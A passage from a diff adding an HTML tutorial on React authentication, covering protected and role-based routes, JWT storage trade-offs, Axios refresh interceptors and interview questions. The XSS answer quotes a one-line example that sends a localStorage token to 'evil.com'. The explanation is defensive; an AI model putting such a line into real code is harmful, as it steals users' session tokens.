+  <span class="kw">if</span> (<span class="type">loading</span>) <span class="kw">return</span> &lt;<span class="fn">Spinner</span> /&gt;;
+
+  <span class="cmt">// Already logged in → redirect to dashboard</span>
+  <span class="kw">if</span> (<span class="type">isAuthenticated</span>) {
+    <span class="kw">return</span> &lt;<span class="fn">Navigate</span> <span class="type">to</span>=<span class="str">"/dashboard"</span> <span class="type">replace</span> /&gt;;
+  }
+
+  <span class="kw">return</span> <span class="type">children</span>;
+}
+
+<span class="cmt">// Usage:</span>
+&lt;<span class="fn">Route</span> <span class="type">path</span>=<span class="str">"/login"</span> <span class="type">element</span>={&lt;<span class="fn">GuestRoute</span>&gt;&lt;<span class="fn">LoginPage</span> /&gt;&lt;/<span class="fn">GuestRoute</span>&gt;} /&gt;
+&lt;<span class="fn">Route</span> <span class="type">path</span>=<span class="str">"/register"</span> <span class="type">element</span>={&lt;<span class="fn">GuestRoute</span>&gt;&lt;<span class="fn">RegisterPage</span> /&gt;&lt;/<span class="fn">GuestRoute</span>&gt;} /&gt;</code></pre>
+        </div>
+
+        <h3>Complete Route Setup</h3>
+        <div class="code-block">
+          <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">App.jsx — Route Configuration</span></div>
+          <pre><code>&lt;<span class="fn">AuthProvider</span>&gt;
+  &lt;<span class="fn">BrowserRouter</span>&gt;
+    &lt;<span class="fn">Routes</span>&gt;
+      {<span class="cmt">/* Public routes — anyone can access */</span>}
+      &lt;<span class="fn">Route</span> <span class="type">path</span>=<span class="str">"/"</span> <span class="type">element</span>={&lt;<span class="fn">Home</span> /&gt;} /&gt;
+      &lt;<span class="fn">Route</span> <span class="type">path</span>=<span class="str">"/about"</span> <span class="type">element</span>={&lt;<span class="fn">About</span> /&gt;} /&gt;
+
+      {<span class="cmt">/* Guest-only routes — redirect if already logged in */</span>}
+      &lt;<span class="fn">Route</span> <span class="type">path</span>=<span class="str">"/login"</span> <span class="type">element</span>={&lt;<span class="fn">GuestRoute</span>&gt;&lt;<span class="fn">Login</span> /&gt;&lt;/<span class="fn">GuestRoute</span>&gt;} /&gt;
+      &lt;<span class="fn">Route</span> <span class="type">path</span>=<span class="str">"/register"</span> <span class="type">element</span>={&lt;<span class="fn">GuestRoute</span>&gt;&lt;<span class="fn">Register</span> /&gt;&lt;/<span class="fn">GuestRoute</span>&gt;} /&gt;
+
+      {<span class="cmt">/* Protected routes — must be logged in */</span>}
+      &lt;<span class="fn">Route</span> <span class="type">path</span>=<span class="str">"/dashboard"</span> <span class="type">element</span>={&lt;<span class="fn">ProtectedRoute</span>&gt;&lt;<span class="fn">Dashboard</span> /&gt;&lt;/<span class="fn">ProtectedRoute</span>&gt;} /&gt;
+      &lt;<span class="fn">Route</span> <span class="type">path</span>=<span class="str">"/profile"</span> <span class="type">element</span>={&lt;<span class="fn">ProtectedRoute</span>&gt;&lt;<span class="fn">Profile</span> /&gt;&lt;/<span class="fn">ProtectedRoute</span>&gt;} /&gt;
+
+      {<span class="cmt">/* Admin-only routes */</span>}
+      &lt;<span class="fn">Route</span> <span class="type">path</span>=<span class="str">"/admin/*"</span> <span class="type">element</span>={
+        &lt;<span class="fn">RoleRoute</span> <span class="type">allowedRoles</span>={[<span class="str">'admin'</span>]}&gt;&lt;<span class="fn">AdminPanel</span> /&gt;&lt;/<span class="fn">RoleRoute</span>&gt;
+      } /&gt;
+
+      &lt;<span class="fn">Route</span> <span class="type">path</span>=<span class="str">"/unauthorized"</span> <span class="type">element</span>={&lt;<span class="fn">Unauthorized</span> /&gt;} /&gt;
+      &lt;<span class="fn">Route</span> <span class="type">path</span>=<span class="str">"*"</span> <span class="type">element</span>={&lt;<span class="fn">NotFound</span> /&gt;} /&gt;
+    &lt;/<span class="fn">Routes</span>&gt;
+  &lt;/<span class="fn">BrowserRouter</span>&gt;
+&lt;/<span class="fn">AuthProvider</span>&gt;</code></pre>
+        </div>
+
+        <div class="diagram">Route Access Matrix:
+
+Route              │ Guest │ User  │ Admin
+───────────────────┼───────┼───────┼──────
+/                  │  ✅   │  ✅   │  ✅    (public)
+/about             │  ✅   │  ✅   │  ✅    (public)
+/login             │  ✅   │  ❌→/dash │  ❌→/dash  (guest only)
+/register          │  ✅   │  ❌→/dash │  ❌→/dash  (guest only)
+/dashboard         │  ❌→/login │  ✅   │  ✅    (protected)
+/profile           │  ❌→/login │  ✅   │  ✅    (protected)
+/admin             │  ❌→/login │  ❌→/unauth │  ✅    (admin only)</div>
+      </div>
+    </div>
+
+    <!-- ==================== TOKEN STORAGE ==================== -->
+    <div class="section-divider" id="token-storage"><span>Token Storage</span></div>
+
+    <div class="card">
+      <div class="card-title">Token Storage — Security Considerations</div>
+      <div class="card-content">
+        <div class="short-answer">
+          Where you store the JWT token determines your app's security posture. Each storage option has different vulnerability profiles. The most secure approach is: <strong>access token in memory</strong> + <strong>refresh token in HttpOnly cookie</strong>.
+        </div>
+
+        <h3>Storage Options Comparison</h3>
+        <table>
+          <tr><th>Storage</th><th>XSS Vulnerable?</th><th>CSRF Vulnerable?</th><th>Persists Refresh?</th><th>Recommendation</th></tr>
+          <tr><td><strong>localStorage</strong></td><td>✅ YES (readable by JS)</td><td>❌ No</td><td>✅ Yes</td><td>⚠️ Convenient but risky</td></tr>
+          <tr><td><strong>sessionStorage</strong></td><td>✅ YES (readable by JS)</td><td>❌ No</td><td>❌ No (tab only)</td><td>⚠️ Same tab only</td></tr>
+          <tr><td><strong>HttpOnly Cookie</strong></td><td>❌ NO (JS can't access)</td><td>✅ YES (auto-sent)</td><td>✅ Yes</td><td>✅ Best for refresh token</td></tr>
+          <tr><td><strong>Memory (variable)</strong></td><td>❌ NO (not in DOM)</td><td>❌ No</td><td>❌ No (lost on refresh)</td><td>✅ Best for access token</td></tr>
+        </table>
+
+        <h3>Option 1: localStorage (Simple but Less Secure)</h3>
+        <div class="code-block">
+          <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">localStorage approach</span></div>
+          <pre><code><span class="cmt">// ⚠️ Simple approach — vulnerable to XSS but works for many apps</span>
+<span class="cmt">// If your app has NO user-generated HTML content, this is acceptable</span>
+
+<span class="cmt">// Store after login</span>
+localStorage.<span class="fn">setItem</span>(<span class="str">'accessToken'</span>, <span class="type">token</span>);
+
+<span class="cmt">// Retrieve for API calls</span>
+<span class="kw">const</span> <span class="type">token</span> = localStorage.<span class="fn">getItem</span>(<span class="str">'accessToken'</span>);
+
+<span class="cmt">// Remove on logout</span>
+localStorage.<span class="fn">removeItem</span>(<span class="str">'accessToken'</span>);
+
+<span class="cmt">// Attach to requests via Axios interceptor</span>
+<span class="fn">axios</span>.interceptors.request.<span class="fn">use</span>((<span class="type">config</span>) =&gt; {
+  <span class="kw">const</span> <span class="type">token</span> = localStorage.<span class="fn">getItem</span>(<span class="str">'accessToken'</span>);
+  <span class="kw">if</span> (<span class="type">token</span>) {
+    <span class="type">config</span>.headers.Authorization = <span class="str">`Bearer ${token}`</span>;
+  }
+  <span class="kw">return</span> <span class="type">config</span>;
+});</code></pre>
+        </div>
+
+        <h3>Option 2: Memory + HttpOnly Cookie (Most Secure)</h3>
+        <div class="code-block">
+          <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">Secure token management</span></div>
+          <pre><code><span class="cmt">// ✅ BEST PRACTICE:</span>
+<span class="cmt">// • Access token → JavaScript variable (memory)</span>
+<span class="cmt">// • Refresh token → HttpOnly, Secure, SameSite cookie (set by server)</span>
+
+<span class="cmt">// Server response sets cookie automatically:</span>
+<span class="cmt">// Set-Cookie: refreshToken=xxx; HttpOnly; Secure; SameSite=Strict; Path=/api/refresh</span>
+
+<span class="cmt">// ─── Client-side: token in memory only ───</span>
+<span class="kw">let</span> <span class="type">accessToken</span> = <span class="num">null</span>; <span class="cmt">// NOT in localStorage!</span>
+
+<span class="kw">export function</span> <span class="fn">setAccessToken</span>(<span class="type">token</span>) {
+  <span class="type">accessToken</span> = <span class="type">token</span>;
+}
+
+<span class="kw">export function</span> <span class="fn">getAccessToken</span>() {
+  <span class="kw">return</span> <span class="type">accessToken</span>;
+}
+
+<span class="cmt">// ─── Silent refresh on app load ───</span>
+<span class="cmt">// On page refresh, memory is cleared → get new access token</span>
+<span class="kw">export async function</span> <span class="fn">silentRefresh</span>() {
+  <span class="kw">try</span> {
+    <span class="cmt">// Cookie is auto-sent (HttpOnly, browser handles it)</span>
+    <span class="kw">const</span> <span class="type">response</span> = <span class="kw">await</span> <span class="fn">axios</span>.<span class="fn">post</span>(<span class="str">'/api/auth/refresh'</span>, {}, {
+      <span class="type">withCredentials</span>: <span class="num">true</span>  <span class="cmt">// Include cookies</span>
+    });
+    <span class="type">accessToken</span> = <span class="type">response</span>.data.accessToken;
+    <span class="kw">return</span> <span class="num">true</span>;
+  } <span class="kw">catch</span> {
+    <span class="type">accessToken</span> = <span class="num">null</span>;
+    <span class="kw">return</span> <span class="num">false</span>;
+  }
+}</code></pre>
+        </div>
+
+        <h3>Axios Interceptor with Auto-Refresh</h3>
+        <div class="code-block">
+          <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">api/axiosInstance.js</span></div>
+          <pre><code><span class="kw">import</span> <span class="fn">axios</span> <span class="kw">from</span> <span class="str">'axios'</span>;
+<span class="kw">import</span> { <span class="fn">getAccessToken</span>, <span class="fn">setAccessToken</span> } <span class="kw">from</span> <span class="str">'./tokenManager'</span>;
+
+<span class="kw">const</span> <span class="type">api</span> = <span class="fn">axios</span>.<span class="fn">create</span>({
+  <span class="type">baseURL</span>: <span class="str">'/api'</span>,
+  <span class="type">withCredentials</span>: <span class="num">true</span>  <span class="cmt">// Send cookies with requests</span>
+});
+
+<span class="cmt">// ─── Request Interceptor: Attach token ───</span>
+<span class="type">api</span>.interceptors.request.<span class="fn">use</span>((<span class="type">config</span>) =&gt; {
+  <span class="kw">const</span> <span class="type">token</span> = <span class="fn">getAccessToken</span>();
+  <span class="kw">if</span> (<span class="type">token</span>) {
+    <span class="type">config</span>.headers.Authorization = <span class="str">`Bearer ${token}`</span>;
+  }
+  <span class="kw">return</span> <span class="type">config</span>;
+});
+
+<span class="cmt">// ─── Response Interceptor: Auto-refresh on 401 ───</span>
+<span class="type">api</span>.interceptors.response.<span class="fn">use</span>(
+  (<span class="type">response</span>) =&gt; <span class="type">response</span>,
+  <span class="kw">async</span> (<span class="type">error</span>) =&gt; {
+    <span class="kw">const</span> <span class="type">originalRequest</span> = <span class="type">error</span>.config;
+
+    <span class="cmt">// If 401 and haven't retried yet</span>
+    <span class="kw">if</span> (<span class="type">error</span>.response?.status === <span class="num">401</span> && !<span class="type">originalRequest</span>._retry) {
+      <span class="type">originalRequest</span>._retry = <span class="num">true</span>;
+
+      <span class="kw">try</span> {
+        <span class="cmt">// Get new access token using refresh cookie</span>
+        <span class="kw">const</span> { <span class="type">data</span> } = <span class="kw">await</span> <span class="fn">axios</span>.<span class="fn">post</span>(<span class="str">'/api/auth/refresh'</span>, {}, {
+          <span class="type">withCredentials</span>: <span class="num">true</span>
+        });
+        <span class="fn">setAccessToken</span>(<span class="type">data</span>.accessToken);
+
+        <span class="cmt">// Retry original request with new token</span>
+        <span class="type">originalRequest</span>.headers.Authorization = <span class="str">`Bearer ${data.accessToken}`</span>;
+        <span class="kw">return</span> <span class="type">api</span>(<span class="type">originalRequest</span>);
+      } <span class="kw">catch</span> (<span class="type">refreshError</span>) {
+        <span class="cmt">// Refresh failed → force logout</span>
+        <span class="fn">setAccessToken</span>(<span class="num">null</span>);
+        window.location.href = <span class="str">'/login'</span>;
+        <span class="kw">return</span> Promise.<span class="fn">reject</span>(<span class="type">refreshError</span>);
+      }
+    }
+    <span class="kw">return</span> Promise.<span class="fn">reject</span>(<span class="type">error</span>);
+  }
+);
+
+<span class="kw">export default</span> <span class="type">api</span>;</code></pre>
+        </div>
+
+        <div class="warning">
+          <strong>⚠️ Security Vulnerabilities:</strong><br>
+          • <strong>XSS (Cross-Site Scripting):</strong> If attacker injects JS into your app, they can read localStorage tokens. Mitigation: sanitize all user input, use CSP headers, never use <code>dangerouslySetInnerHTML</code> with user content.<br>
+          • <strong>CSRF (Cross-Site Request Forgery):</strong> If using cookies, other sites can trigger requests. Mitigation: <code>SameSite=Strict</code> cookie flag, CSRF tokens.<br>
+          • <strong>Token theft:</strong> Never log tokens, never put in URLs, never send to 3rd-party scripts.
+        </div>
+
+        <div class="remember">
+          <strong>💡 Production Security Checklist:</strong><br>
+          ✅ Use HTTPS everywhere (tokens are plain text over HTTP)<br>
+          ✅ Set short access token expiry (15 min)<br>
+          ✅ Store refresh token in HttpOnly cookie<br>
+          ✅ Add <code>SameSite=Strict</code> to cookies<br>
+          ✅ Implement token rotation (new refresh token each use)<br>
+          ✅ Sanitize all user-generated content (prevent XSS)<br>
+          ✅ Add Content Security Policy (CSP) headers<br>
+          ✅ Never expose secrets in frontend code
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== REAL PROJECT ==================== -->
+    <div class="section-divider" id="real-project"><span>Real Project Example</span></div>
+
+    <div class="card">
+      <div class="card-title">Complete Auth System: Production-Ready</div>
+      <div class="card-content">
+        <p>A full authentication system with auto-refresh, persistent sessions, loading states, and role-based access — as used in real production apps.</p>
+
+        <div class="diagram">Project Structure:
+
+src/
+├── api/
+│   └── axiosInstance.js       ← Interceptors (attach token, auto-refresh)
+├── context/
+│   └── AuthContext.jsx        ← Global auth state (user, token, login, logout)
+├── components/
+│   ├── ProtectedRoute.jsx     ← Auth guard
+│   ├── RoleRoute.jsx          ← Role-based guard
+│   └── GuestRoute.jsx         ← Reverse guard (logged-in → redirect)
+├── pages/
+│   ├── LoginPage.jsx          ← Login form
+│   ├── RegisterPage.jsx       ← Registration form
+│   ├── Dashboard.jsx          ← Protected page
+│   └── AdminPanel.jsx         ← Admin-only page
+├── services/
+│   └── authService.js         ← API calls (login, register, refresh)
+└── App.jsx                    ← Route definitions</div>
+
+        <div class="code-block">
+          <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">Full AuthProvider with Token Refresh</span></div>
+          <pre><code><span class="kw">import</span> { <span class="fn">createContext</span>, <span class="fn">useContext</span>, <span class="fn">useState</span>, <span class="fn">useEffect</span>, <span class="fn">useCallback</span>, <span class="fn">useRef</span> } <span class="kw">from</span> <span class="str">'react'</span>;
+<span class="kw">import</span> <span class="type">api</span> <span class="kw">from</span> <span class="str">'../api/axiosInstance'</span>;
+
+<span class="kw">const</span> <span class="fn">AuthContext</span> = <span class="fn">createContext</span>(<span class="num">null</span>);
+
+<span class="kw">export function</span> <span class="fn">AuthProvider</span>({ <span class="type">children</span> }) {
+  <span class="kw">const</span> [<span class="type">user</span>, <span class="fn">setUser</span>] = <span class="fn">useState</span>(<span class="num">null</span>);
+  <span class="kw">const</span> [<span class="type">loading</span>, <span class="fn">setLoading</span>] = <span class="fn">useState</span>(<span class="num">true</span>);
+  <span class="kw">const</span> <span class="type">refreshTimerRef</span> = <span class="fn">useRef</span>(<span class="num">null</span>);
+
+  <span class="cmt">// ─── Silent refresh on app mount ───</span>
+  <span class="fn">useEffect</span>(() =&gt; {
+    <span class="kw">const</span> <span class="fn">initAuth</span> = <span class="kw">async</span> () =&gt; {
+      <span class="kw">try</span> {
+        <span class="cmt">// Try to get new access token using refresh cookie</span>
+        <span class="kw">const</span> { <span class="type">data</span> } = <span class="kw">await</span> <span class="type">api</span>.<span class="fn">post</span>(<span class="str">'/auth/refresh'</span>);
+        <span class="fn">setUser</span>(<span class="type">data</span>.user);
+        <span class="fn">scheduleRefresh</span>(<span class="type">data</span>.expiresIn);
+      } <span class="kw">catch</span> {
+        <span class="cmt">// No valid session — user must login</span>
+        <span class="fn">setUser</span>(<span class="num">null</span>);
+      } <span class="kw">finally</span> {
+        <span class="fn">setLoading</span>(<span class="num">false</span>);
+      }
+    };
+    <span class="fn">initAuth</span>();
+    <span class="kw">return</span> () =&gt; <span class="fn">clearTimeout</span>(<span class="type">refreshTimerRef</span>.current);
+  }, []);
+
+  <span class="cmt">// ─── Auto-refresh before token expires ───</span>
+  <span class="kw">const</span> <span class="fn">scheduleRefresh</span> = <span class="fn">useCallback</span>((<span class="type">expiresIn</span>) =&gt; {
+    <span class="cmt">// Refresh 1 minute before expiry</span>
+    <span class="kw">const</span> <span class="type">refreshTime</span> = (<span class="type">expiresIn</span> - <span class="num">60</span>) * <span class="num">1000</span>;
+    <span class="type">refreshTimerRef</span>.current = <span class="fn">setTimeout</span>(<span class="kw">async</span> () =&gt; {
+      <span class="kw">try</span> {
+        <span class="kw">const</span> { <span class="type">data</span> } = <span class="kw">await</span> <span class="type">api</span>.<span class="fn">post</span>(<span class="str">'/auth/refresh'</span>);
+        <span class="fn">scheduleRefresh</span>(<span class="type">data</span>.expiresIn);
+      } <span class="kw">catch</span> {
+        <span class="fn">setUser</span>(<span class="num">null</span>);
+      }
+    }, <span class="type">refreshTime</span>);
+  }, []);
+
+  <span class="cmt">// ─── Login ───</span>
+  <span class="kw">const</span> <span class="fn">login</span> = <span class="fn">useCallback</span>(<span class="kw">async</span> (<span class="type">email</span>, <span class="type">password</span>) =&gt; {
+    <span class="kw">const</span> { <span class="type">data</span> } = <span class="kw">await</span> <span class="type">api</span>.<span class="fn">post</span>(<span class="str">'/auth/login'</span>, { <span class="type">email</span>, <span class="type">password</span> });
+    <span class="fn">setUser</span>(<span class="type">data</span>.user);
+    <span class="fn">scheduleRefresh</span>(<span class="type">data</span>.expiresIn);
+  }, [<span class="fn">scheduleRefresh</span>]);
+
+  <span class="cmt">// ─── Logout ───</span>
+  <span class="kw">const</span> <span class="fn">logout</span> = <span class="fn">useCallback</span>(<span class="kw">async</span> () =&gt; {
+    <span class="kw">await</span> <span class="type">api</span>.<span class="fn">post</span>(<span class="str">'/auth/logout'</span>);  <span class="cmt">// Invalidate refresh token on server</span>
+    <span class="fn">setUser</span>(<span class="num">null</span>);
+    <span class="fn">clearTimeout</span>(<span class="type">refreshTimerRef</span>.current);
+  }, []);
+
+  <span class="kw">const</span> <span class="type">value</span> = {
+    <span class="type">user</span>,
+    <span class="type">isAuthenticated</span>: !!<span class="type">user</span>,
+    <span class="type">loading</span>,
+    <span class="fn">login</span>,
+    <span class="fn">logout</span>,
+    <span class="type">isAdmin</span>: <span class="type">user</span>?.role === <span class="str">'admin'</span>
+  };
+
+  <span class="kw">return</span> (
+    &lt;<span class="fn">AuthContext.Provider</span> <span class="type">value</span>={<span class="type">value</span>}&gt;
+      {<span class="type">children</span>}
+    &lt;/<span class="fn">AuthContext.Provider</span>&gt;
+  );
+}
+
+<span class="kw">export const</span> <span class="fn">useAuth</span> = () =&gt; {
+  <span class="kw">const</span> <span class="type">ctx</span> = <span class="fn">useContext</span>(<span class="fn">AuthContext</span>);
+  <span class="kw">if</span> (!<span class="type">ctx</span>) <span class="kw">throw new</span> <span class="fn">Error</span>(<span class="str">'useAuth must be inside AuthProvider'</span>);
+  <span class="kw">return</span> <span class="type">ctx</span>;
+};</code></pre>
+        </div>
+
+        <div class="tip">
+          <strong>💡 Production Auth Features Included:</strong><br>
+          • <strong>Silent refresh:</strong> On page reload, auto-authenticates from cookie<br>
+          • <strong>Proactive refresh:</strong> Schedules token refresh BEFORE expiry (no 401 interruption)<br>
+          • <strong>Server-side logout:</strong> Invalidates refresh token (user can't re-authenticate after logout)<br>
+          • <strong>Role check:</strong> <code>isAdmin</code> flag for conditional UI rendering<br>
+          • <strong>Loading state:</strong> Prevents flash of login page on authenticated refresh
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== INTERVIEW Q&A ==================== -->
+    <div class="section-divider" id="interview"><span>Interview Q&A</span></div>
+
+    <div class="card">
+      <div class="card-title">Authentication Interview Questions</div>
+      <div class="card-content card-content-QA theme-purple">
+        <div class="q-block">Q: What is JWT and how does it work?</div>
+        <div class="a-block"><strong>A:</strong> JWT (JSON Web Token) is a compact token format with three Base64-encoded parts: Header (algorithm), Payload (claims/user data), and Signature (verification hash). The server creates it on login using a secret key. The client sends it with every request in the Authorization header. The server verifies the signature without needing a database lookup — making it stateless and scalable.</div>
+
+        <div class="q-block">Q: Where should you store JWT tokens in a React app?</div>
+        <div class="a-block"><strong>A:</strong> The most secure approach: <strong>access token in memory</strong> (JavaScript variable) + <strong>refresh token in HttpOnly cookie</strong> (set by server). localStorage is convenient but vulnerable to XSS attacks — any injected script can steal tokens. HttpOnly cookies can't be accessed by JavaScript, preventing XSS theft. For simpler apps without user-generated content, localStorage with short token expiry is acceptable.</div>
+
+        <div class="q-block">Q: What is the difference between access token and refresh token?</div>
+        <div class="a-block"><strong>A:</strong> <strong>Access token:</strong> short-lived (15 min), sent with every API request, if stolen damage is limited. <strong>Refresh token:</strong> long-lived (7-30 days), used ONLY to get new access tokens, stored more securely (HttpOnly cookie). When access token expires, the client silently gets a new one using the refresh token — no re-login needed. Refresh tokens can be revoked on the server (blacklisted).</div>
+
+        <div class="q-block">Q: How do you implement protected routes in React?</div>
+        <div class="a-block"><strong>A:</strong> Create a wrapper component that checks <code>isAuthenticated</code> from auth context. If false, render <code>&lt;Navigate to="/login"&gt;</code> with the current location in state (so you can redirect back after login). If true, render <code>children</code>. Wrap protected routes: <code>&lt;Route element={&lt;ProtectedRoute&gt;&lt;Dashboard/&gt;&lt;/ProtectedRoute&gt;}/&gt;</code>. Also handle loading state to avoid flashing the login page.</div>
+
+        <div class="q-block">Q: How do you handle token expiration and auto-refresh?</div>
+        <div class="a-block"><strong>A:</strong> Two approaches: (1) <strong>Reactive:</strong> Axios response interceptor catches 401 errors, calls /refresh endpoint, retries the original request with new token. (2) <strong>Proactive:</strong> Schedule a timer to refresh the token BEFORE it expires (e.g., 1 minute before). Proactive is better UX — users never see a failed request. Combine both for robustness.</div>
+
+        <div class="q-block">Q: What is XSS and how does it relate to auth?</div>
+        <div class="a-block"><strong>A:</strong> XSS (Cross-Site Scripting) is when an attacker injects malicious JavaScript into your app (via user input, 3rd-party scripts). If tokens are in localStorage, the injected script can steal them: <code>fetch('evil.com?token=' + localStorage.getItem('token'))</code>. Prevention: sanitize all user input, use HttpOnly cookies (JS can't access), Content Security Policy headers, never use <code>dangerouslySetInnerHTML</code> with untrusted data.</div>
+
+        <div class="q-block">Q: How do you implement role-based access control (RBAC)?</div>
+        <div class="a-block"><strong>A:</strong> Store user role in JWT payload and auth context. Create a <code>RoleRoute</code> component that accepts <code>allowedRoles</code> array. Check if <code>user.role</code> is included — if not, redirect to /unauthorized. This handles route-level RBAC. For component-level: <code>{user.role === 'admin' && &lt;DeleteButton/&gt;}</code>. Always enforce roles on the BACKEND too — frontend RBAC is for UX only, not security.</div>
+
+        <div class="q-block">Q: What happens when a user refreshes the page? How do you persist auth?</div>
+        <div class="a-block"><strong>A:</strong> On page refresh, JavaScript memory is cleared (access token gone). Solutions: (1) Store access token in localStorage (simple, less secure). (2) Use HttpOnly refresh cookie — on app mount, call /refresh endpoint to get new access token (silent refresh). The AuthProvider runs this check in useEffect on mount, showing a loading spinner until auth state is determined.</div>
+
+        <div class="q-block">Q: What is CSRF and how do you prevent it with cookies?</div>
+        <div class="a-block"><strong>A:</strong> CSRF (Cross-Site Request Forgery) is when a malicious site triggers a request to your API — if using cookies, the browser auto-attaches them. Prevention: (1) <code>SameSite=Strict</code> cookie flag (browser won't send cookie from other sites), (2) CSRF tokens (random token in form, verified by server), (3) Check <code>Origin</code>/<code>Referer</code> headers on server. With <code>SameSite=Strict</code> and modern browsers, CSRF is largely mitigated.</div>
+      </div>
+    </div>
+
+  </div>
+</body>
+</html>
